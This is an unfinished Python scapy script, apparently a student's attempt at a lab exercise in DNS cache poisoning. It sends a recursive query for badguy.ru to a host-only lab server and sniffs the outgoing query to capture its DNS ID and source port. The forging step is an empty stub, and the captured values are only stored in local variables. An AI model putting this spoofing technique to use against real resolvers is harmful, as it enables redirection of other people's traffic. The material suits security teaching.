'''
- For the attack to succeed, you have to parse a queryid number from a query made to badguy.ru. 
  You can extract a query by programming a small udp server listening on badguyDNSport on your attacking machine. 
  Hence, whenever you do a query for badguy.ru, the vulnDNS serve will make a recursive query to badguy.ru 
  (which is your machine)
- Remember that you should also have another UDP server listening for the FLAG on port 1337 
  (the flag is sent only if the attack is successful).
- For any issue look at the dns.log file, which logs all queries received as well as successfull attacks.
- If possible write everything under one program only so that all is automated for the attack 
  (parsing of queryID, cache poisoning and reception of the FLAG).
  '''

from threading import Thread
import time
from random import randint
from scapy.layers.inet import *
from scapy.layers.dns import *
from scapy.all import *

qID = 0         # query ID globale
port = 0        # porta da catturare

class FirstThread(Thread):

        def __init__(self, name, job):
                Thread.__init__(self)
                self.name = name
                self.job = job

        def run(self):
                print ("Thread '" + self.name + "' avviato")
                # time.sleep(self.durata)

                if self.job == 0:                                                       # sniffer
                        sniffer_job()
                        print ("Thread '" + self.name + "' terminato")

                if self.job == 1:                                                       # sender
                        time.sleep(1)
                        sender_job()
                        print ("Thread '" + self.name + "' terminato")


def sender_job():
        # invio la prima query DNS
        send(IP(dst="192.168.56.101") / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
        #pkt = sr1(IP(dst="192.168.56.101") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
        # p.show()
        '''# sniffo i pacchetti delle query ricorsive
        pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 55553", prn=lambda x: x.show())

        print (len(pkts))
        qID = pkts[0].getlayer(DNS).id
        port = pkts[0].getlayer(UDP).sport
        print ('found qID: ' + qID)
        print ('found port: ' + port)'''


def sniffer_job():
        # sniffo i pacchetti delle query ricorsive
        #pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
        pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))

        print ('trovati ' + str(len(pkts)) + ' pacchetti')
        qID = pkts[0].getlayer(DNS).id
        port = pkts[0].getlayer(UDP).sport
        print ('found qID: ' + str(hex(qID)))
        print ('found port: ' + str(port))

def forger_job():
        '''
        TODO finire
        '''


# Creazione dei thread
thread1 = FirstThread("sniffer", 0)
thread2 = FirstThread("sender", 1)

# Avvio dei thread
thread1.start()
thread2.start()

# Join
thread1.join()
thread2.join()